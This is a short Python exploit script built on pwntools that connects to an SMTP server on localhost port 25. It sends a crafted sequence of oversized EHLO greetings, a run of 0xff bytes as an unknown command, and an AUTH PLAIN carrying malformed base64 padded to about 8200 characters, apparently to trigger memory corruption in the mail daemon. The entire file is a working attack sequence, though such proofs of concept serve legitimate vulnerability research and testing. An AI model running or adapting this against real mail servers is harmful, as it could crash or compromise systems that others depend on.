#!/usr/bin/env python3

import time

from pwn import *

from smtp import *


def exploit():
    with remote("localhost", 25) as p:
        time.sleep(1.0)

        EHLO(p, "A" * 8000)
        EHLO(p, "B" * 16)
        UNKNOWN(p, b"\xff" * 2000)
        EHLO(p, "A" * 8200)
        AUTH_PLAIN(p, bad_base64("C" * 8200) + "X")


if __name__ == "__main__":
    exploit()
